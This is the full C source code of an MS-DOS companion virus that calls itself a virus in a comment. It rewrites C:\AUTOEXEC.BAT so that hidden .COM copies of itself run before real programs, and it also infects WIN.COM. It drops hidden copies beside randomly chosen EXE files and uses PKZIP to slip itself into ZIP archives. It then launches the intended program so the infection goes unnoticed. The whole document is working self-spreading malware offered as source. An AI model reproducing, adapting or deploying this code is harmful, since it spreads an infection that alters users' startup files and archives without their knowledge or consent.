#include <stdio.h>
#include <string.h>
#include <dos.h>
#include <stdlib.h>
#include <dir.h>
#include <process.h>
#include <io.h>
#include <fcntl.h>
#include <sys\stat.h>
#include <time.h>

#define BUFF_SIZE       32000   /* buff size for file_copy */
#define DIR_CYCLE       80
#define EXE_CYCLE       2  /* these work differently than DIR_CYCLE */
#define ZIP_CYCLE       2  /*                                       */

void    record_on(void);
void    record_off(void);
void    proliferate(void);
void    business_as_usual(char *intentions[]);
int     target_autoexec(void);
int     saturated_autoexec(void);
void    mark_saturated(void);
void    extract_filename(char *str, char *fname);
void    intract_filename(char *str, char *fname);
int     exep_p(char filename[50]);
int     win_p(char filename[50]);
int     inf_p(char filename[50]);
int     exist_p(char filename[50]);
void    choose_target(void);
void    record_infection(void);
void    infect_target(void);
void    infect_exe(void);
void    infect_win(void);
void    infect_zip(void);
int     choose_int_target(void);
void    inject();
void    com(char *filename);
void    fcom(char *filename);
void    exe(char *filename);
int     exe_p(char filename[50]);
int     com_p(char filename[50]);
int     file_copy(char *file1, char *file2);

char source[50];
char target[50];
char int_target[50];

char id[] = "Z‹pDv‹l‘v0.1";

FILE *rec;
int friendly; /* flag for friendly users with C:\EX.BAT */

void main(int argc, char *argv[]) {

  strcpy(source,argv[0]);

  randomize();

  record_on();

  proliferate();

  record_off();

  business_as_usual(argv);

}

void record_on(void)
{
  if (friendly = exist_p("C:\\EX.BAT")) {
    fclose(rec);
    rec = fopen("C:\\EX.BAT","a");
  }
}

void record_off(void)
{
  if(friendly) fclose(rec);
}

void proliferate(void)
{

  if(saturated_autoexec()) {
    choose_target();
    infect_target();
  }
  else if(!target_autoexec()) {
    choose_target();
    infect_target();
  }

}

int target_autoexec(void)
{
  char buf[150];
  char cur[1];
  char tempfile[50], buftest[50];
  int done, mod, infect_exec, infect_wind;
  int in, out;
  int ct;

  if ((in = open("C:\\AUTOEXEC.BAT", O_RDONLY | O_TEXT)) == -1)
    return 0; /* !? can't open autoexec.bat on drive C ?! */

  done = infect_exec = infect_wind = 0;
  while(!done) {

    cur[0]='.'; ct=0;
    while(!(eof(in) || (cur[0] == '\n') ||
		       (ct>=149))) {
      if (read(in,cur,1)==-1) return 0; /* read error, so forget it */
      buf[ct++] = cur[0];
    }
    buf[ct-1] = '\0';

    extract_filename(buf,target);

    if(win_p(target)) {
      if (!exe_p(target)) infect_wind = 1; /*win not infected*/
    }
    else if(exep_p(target)) {
      if (exe_p(target)) infect_exec = 1; /*autoexec not yet modified 4this1*/
      else
	infect_exec = !inf_p(target); /* is the EXE on infected? */
    }

    if (eof(in)) { /* nothing left to infect */
      close(in);
      mark_saturated();
      return 0;
    }

    done = (infect_exec || infect_wind);

  }

  close(in);

  strcpy(tempfile,"C:\\");
  if((out = creattemp(tempfile,0)) < 0) return 0;                           /* so forget about it        */

  if ((in = open("C:\\AUTOEXEC.BAT", O_RDONLY | O_TEXT)) == -1) {
    close(out);
    unlink(tempfile);
    return 0; /* !? can't open autoexec.bat on drive C ?! */
  }

  done = mod = 0;
  while(!done) {

    /* read a line from autoexec.bat */
    ct=0; cur[0]='.';
    while(!(eof(in) || (cur[0] == '\n') || (ct>=149))) {
      if ( read( in,cur,1)==-1) {
	unlink(tempfile);
	return 0; /* read error, so forget it */
      }
	buf[ct++] = cur[0];
    }
    buf[ct-1] = '\0';

    if(!mod) { /* if the modification has not yet been done */

      /* figure out which file is being called in this line */
      extract_filename(buf,buftest);

      /* if this is our target modify this line appropriately*/
      if(!strcmp(buftest,target)) {

	if(infect_exec) com(buftest); /* standard companion */
	else exe(buftest); /* infecting win.com */

	intract_filename(buf,buftest);
	mod = 1;
      }
    }

    write(out,buf,strlen(buf));
    write(out,"\n",1);

    done=eof(in);
  }


  if(infect_exec) exe(target);
  else      fcom(target); /* its win.com */

  if(!exist_p(target)) strcpy(target,searchpath(target));
  infect_target();

  close(in);
  close(out);
  file_copy(tempfile,"C:\\AUTOEXEC.BAT");
  unlink(tempfile);

  return 1;                     /* autoexec has been targeted & modified */
}

int saturated_autoexec(void)
{
  ffblk ffblk;
  char sat_file[50];

  if(findfirst("C:\\*.",&ffblk,FA_DIREC))
    return 0; /* !? no directories on C ?! */

  strcpy(sat_file,"C:\\");
  strcat(sat_file,ffblk.ff_name);
  strcat(sat_file,"\\");
  strcat(sat_file,ffblk.ff_name);

  if(findfirst(sat_file,&ffblk,FA_HIDDEN))
    return 0; /* not yet saturated */
  else return 1; /* file is here so it is saturated */

}

void mark_saturated(void)
{
  ffblk ffblk;
  char sat_file[50];

  if(findfirst("C:\\*.",&ffblk,FA_DIREC))
    return; /* !? no directories on C ?! */

  strcpy(sat_file,"C:\\");
  strcat(sat_file,ffblk.ff_name);
  strcat(sat_file,"\\");
  strcat(sat_file,ffblk.ff_name);

  if(!exist_p(sat_file)) { /* just in case (uphold no damage promise) */
    fclose(fopen(sat_file,"w")); /* best effort at creation */
    _chmod(sat_file,1,FA_HIDDEN);

    if(friendly) fprintf(rec,"@attrib %s -h\n@DEL %s\n",sat_file,sat_file);
  }
}

void extract_filename(char *str, char *fname)
{
  int i, len, start;
  int slash_ct;


  /* of course this is bad programming practice, but fuck it; its a virus */

  /*            BTW, these are not necessary; they only speed             */
  /*            things up, so its not necessary to think of all o'these   */
  if( (((str[0]=='R') || (str[0]=='r')) &&
       ((str[1]=='E') || (str[1]=='e')) &&
       ((str[2]=='M') || (str[2]=='m')) &&
       (str[3]==' '))                           ||
      (((str[0]=='S') || (str[0]=='s')) &&
       ((str[1]=='E') || (str[1]=='e')) &&
       ((str[2]=='T') || (str[2]=='t')) &&
	(str[3]==' '))                          ||
      (((str[0]=='L') || (str[0]=='L')) &&
       ((str[1]=='H') || (str[1]=='H')) &&
	(str[2]==' '))                          ||
      (((str[0]=='E') || (str[0]=='e')) &&
       ((str[1]=='C') || (str[1]=='c')) &&
       ((str[2]=='H') || (str[2]=='h')) &&
       ((str[3]=='O') || (str[3]=='o')) &&
	(str[4]==' '))                          ||
      (((str[0]=='C') || (str[0]=='c')) &&
       ((str[1]=='A') || (str[1]=='a')) &&
       ((str[2]=='L') || (str[2]=='l')) &&
       ((str[3]=='L') || (str[3]=='l')) &&
	(str[4]==' '))                          ||
      (((str[0]=='L') || (str[0]=='l')) &&
       ((str[1]=='O') || (str[1]=='o')) &&
       ((str[2]=='A') || (str[2]=='a')) &&
       ((str[3]=='D') || (str[3]=='d')) &&
       ((str[4]=='H') || (str[4]=='h')) &&
       ((str[5]=='I') || (str[5]=='i')) &&
       ((str[6]=='G') || (str[6]=='g')) &&
       ((str[7]=='H') || (str[7]=='h')) &&
	(str[8]==' '))                          ||
      (((str[0]=='P') || (str[0]=='p')) &&
       ((str[1]=='R') || (str[1]=='r')) &&
       ((str[2]=='O') || (str[2]=='o')) &&
       ((str[3]=='M') || (str[3]=='m')) &&
       ((str[4]=='P') || (str[4]=='p')) &&
       ((str[5]=='T') || (str[5]=='t')) &&
	(str[6]==' '))                          ||
      (((str[0]=='P') || (str[0]=='p')) &&
       ((str[1]=='A') || (str[1]=='a')) &&
       ((str[2]=='U') || (str[2]=='u')) &&
       ((str[3]=='S') || (str[3]=='s')) &&
       ((str[4]=='E') || (str[4]=='e')) &&
       ((str[5]==' ') || (str[5]=='\0'))) )
  {
    strcpy(fname,"");   /* its definitely not a filename */
    return;
  }


  len = 0;
  while((str[len] != '\0') && (str[len] != ' ')) {

    if (str[len] == '=') {
      strcpy(fname,"");
      return;
    }

    len++;
  }


  start = (str[0]=='@');

  for(i=start; i<len; i++) fname[i-start] = str[i];
  fname[len-start] = '\0';

}

void intract_filename(char *str, char *fname)
{
  int i,j;
  int start;
  char strcp[150];
  char oname[50];

  i=0;
  while(str[i]!=' ' && str[i]!='\0') {
    oname[i] = str[i];
    i++;
  }
  oname[i]='\0';

  strcpy(strcp,str);

  start = (str[0]=='@');

  i=start;
  while(str[i] == fname[i-start])
    i++;

  j=i;

  while(fname[i-start] != '\0') {
    strcp[i] = fname[i-start];
    i++;
  }

  if(exe_p(oname) || com_p(oname)) j+=3;

  while(str[j] != '\0') {
    strcp[i] = str[j];
    j++; i++;
  }
  strcp[i]='\0';

  strcpy(str,strcp);

}

int exep_p(char filename[50])
{
  char sname[50];

  if (exe_p(filename)) return 1;
  if (com_p(filename)) return 0;

  strcpy(sname,filename);
  strcat(sname,".EXE");

  return (searchpath(sname)!=NULL);
}

int win_p(char filename[50])
{
  int l;

  l = strlen(filename);

  if(exe_p(filename) || com_p(filename)) l-=4;

  if( (((filename[l-3]=='W')  ||  (filename[l-3]=='w'))  &&
       ((filename[l-2]=='I')  ||  (filename[l-2]=='i'))  &&
       ((filename[l-1]=='N')  ||  (filename[l-1]=='n'))) )

       return ((filename[l-4] == '\\') ||
	       (l-4 < 0)); /* no path in name*/

  else return 0;
}

int inf_p(char filename[50])
{
  char xtra[50];

  strcpy(xtra,filename);
  if(!exist_p(xtra)) strcpy(xtra,searchpath(target));
  com(xtra);
  return exist_p(xtra);
}

int exist_p(char filename[50])
{
  FILE *ttmp;

  if ( (ttmp = fopen(filename,"r")) != NULL) {
    fclose(ttmp);
    return 1;
  }
  else return 0;

}

void choose_target()
{
  int done,stop_here;
  struct ffblk ffblk;
  char path[50],search[50];

NewDirectory:

  path[0] = 'A' + getdisk();
  path[1] = ':';
  path[2] = '\\';
  path[3] = '\0';


  strcpy(search,path);
  strcat(search,"*.");

  stop_here = random(DIR_CYCLE)+1;
  while(stop_here) {
    done = findfirst(search,&ffblk,FA_DIREC);
    while (!done && stop_here)
    {
      done = findnext(&ffblk);
      stop_here--;
    }
  }

  strcat(path,ffblk.ff_name);
  strcat(path,"\\");

  strcpy(search,path);
  strcat(search,"*.ZIP");

  if(!findfirst(search,&ffblk,0)) {  // if there are any ZIPs */
    stop_here = 0;
    while(!stop_here) {
      done = findfirst(search,&ffblk,0);
      while (!done && !stop_here)
      {
	done = findnext(&ffblk);
	stop_here = (random(ZIP_CYCLE)==0);
      }
    }
  }

  else { /* look for EXEs instead */

    strcpy(search,path);
    strcat(search,"*.EXE");

    /* no EXE's in this dir */
    if(findfirst(search,&ffblk,0)==-1) goto NewDirectory;

    stop_here = 0;
    while(!stop_here) {
      done = findfirst(search,&ffblk,0);
      while (!done && !stop_here)
      {
	done = findnext(&ffblk);
	stop_here = (random(EXE_CYCLE)==0);
      }
    }
  }

  /* the decision has been made */
  strcpy(target,path);
  strcat(target,ffblk.ff_name);

}

void infect_target(void)
{
  if (exe_p(target))
    infect_exe();
  else if (com_p(target))
    infect_win();
  else
    infect_zip();

}

void infect_exe(void)
{
  com(target);

  if(exist_p(target)) return; /* already infected, dummy */

  file_copy(source,target);
  _chmod(target,1,FA_HIDDEN);
  if(friendly) fprintf(rec,"@attrib %s -h >nul\n@DEL %s >nul\n",target,target);
}

void infect_win(void)
{
  exe(target);

  if(exist_p(target)) return; /* already infected, dummy */

  file_copy(source,target);
  _chmod(target,1,FA_HIDDEN);
  if(friendly) fprintf(rec,"@attrib %s -h >nul\n@DEL %s >nul\n",target,target);

}

void infect_zip()
{

  if (!choose_int_target())
    inject();
  else return; /* no luck this time */

}

int choose_int_target()
{
  char command[100];
  char dupl[50],scn[50];
  FILE *in;

  strcpy(command, searchpath("PKZIP.EXE"));
  strcat(command," -V ");
  strcat(command,target);
  strcat(command," *.EXE > T0.0T");

  system(command);

  if((in = fopen("T0.0T","rt"))==NULL) return -1;

  strcpy(int_target,"");
  while((!exe_p(int_target)) && (!feof(in)))
    fscanf(in,"%s",int_target);

  rewind(in);

  strcpy(dupl,int_target);
  com(dupl);
  while((!strcmp(dupl,scn)) && (!feof(in)))
    fscanf(in,"%s",scn);

  fclose(in);
  remove("T0.0T");

  if(!strcmp(dupl,scn) || !exe_p(int_target)) return -1;
  else return 0;

}

void inject()
{
  char command[100];

  com(int_target);
  if (file_copy(source,int_target)) return;

  strcpy(command,searchpath("PKZIP.EXE"));
  strcat(command," -A ");
  strcat(command,target);
  strcat(command," ");
  strcat(command,int_target);
  strcat(command," > nul");

  system(command);

  if(friendly) fprintf(rec,"@PKZIP.EXE -D %s %s >nul\n", target, int_target);

  remove(int_target);
}

void com(char *filename)
{
  int len;

  len = strlen(filename);

  if(filename[len-4]=='.') {
    filename[len-3] = '\0';
    strcat(filename,"COM");
  }
}

void fcom(char *filename)
{
  int len;

  len = strlen(filename);

  if(filename[len-4]=='.') {
    filename[len-3] = '\0';
    strcat(filename,"COM");
  }
  else strcat(filename,".COM");
}

void exe(char *filename)
{
  int len;

  len = strlen(filename);

  if(filename[len-4]=='.') {
    filename[len-3] = '\0';
    strcat(filename,"EXE");
  }
  else strcat(filename,".EXE");
}

int exe_p(char filename[50])
{
  int l;

  l = strlen(filename);

  if( ((filename[l-3]=='E') || (filename[l-3]=='e')) &&
      ((filename[l-2]=='X') || (filename[l-2]=='x')) &&
      ((filename[l-1]=='E') || (filename[l-1]=='e')) )
    return 1;
  else
    return 0;

}

int com_p(char filename[50])
{
  int l;

  l = strlen(filename);

  if((filename[l-3]=='C')&&(filename[l-2]=='O')&&(filename[l-1]=='M'))
    return 1;
  else
    return 0;

}

void business_as_usual(char *intentions[])
{
  char real_prog[50];

  strcpy(real_prog,intentions[0]);

  if (exe_p(real_prog)) {
    if (win_p(real_prog)) com(real_prog); /* its a windows infection */

    else return; /* running only as a dropper */
  }
  else exe(real_prog);  /* typical companion infection */

  execvp(real_prog, intentions);

}


int file_copy(char *file1, char *file2)
{
	int             SourceFile, DestFile, BytesRead;
	int             error;
	char            *buffer;
	unsigned        fdate, ftime;


	buffer = (char *)malloc(BUFF_SIZE);
	if (!buffer)
	{
		return(1);
	}

	SourceFile = open(file1, O_RDONLY|O_BINARY);
	if (SourceFile == -1)
	{
		free(buffer);
		return(1);
	}
	DestFile = open(file2, O_RDWR|O_BINARY|O_CREAT, S_IWRITE);
	if (DestFile == -1)
	{
		close(SourceFile);
		free(buffer);
		return(1);
	}

	while (1)
	{
		BytesRead = read(SourceFile, buffer, BUFF_SIZE);
		if (BytesRead == -1)
		{
			close(SourceFile);
			close(DestFile);
			free(buffer);
			return(1);
		}
		if (BytesRead == 0)
			break;

		error = write(DestFile, buffer, BytesRead);
		if (error == -1)
		{
			close(SourceFile);
			close(DestFile);
			free(buffer);
			return(1);
		}
	}

	close(SourceFile);
	close(DestFile);
	free(buffer);
	return(0);
}
